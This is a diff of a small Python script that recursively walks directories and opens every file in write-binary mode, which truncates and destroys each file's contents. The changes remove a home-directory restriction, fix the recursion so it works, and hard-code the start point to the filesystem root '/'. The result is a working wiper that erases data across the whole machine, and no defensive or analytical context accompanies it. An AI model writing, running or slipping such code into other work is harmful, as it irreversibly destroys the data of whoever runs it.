@@ -2,12 +2,6 @@ import getpass
 import os
 
 
-if getpass.getuser() == "root":
-	root = "/"
-else:
-	root = "/home/{}".format(getpass.getuser())
-
-
 def main(root):
 	global items
 
@@ -15,7 +9,7 @@ def main(root):
 	for child in children:
 		child = root + "/" + child
 		if os.path.isdir(child):
-			find_files(child)
+			main(child)
 		else:
 			try:
 				f = open(child, "bw")
@@ -25,4 +19,4 @@ def main(root):
 				pass
 
 
-main(root)
+main("/")
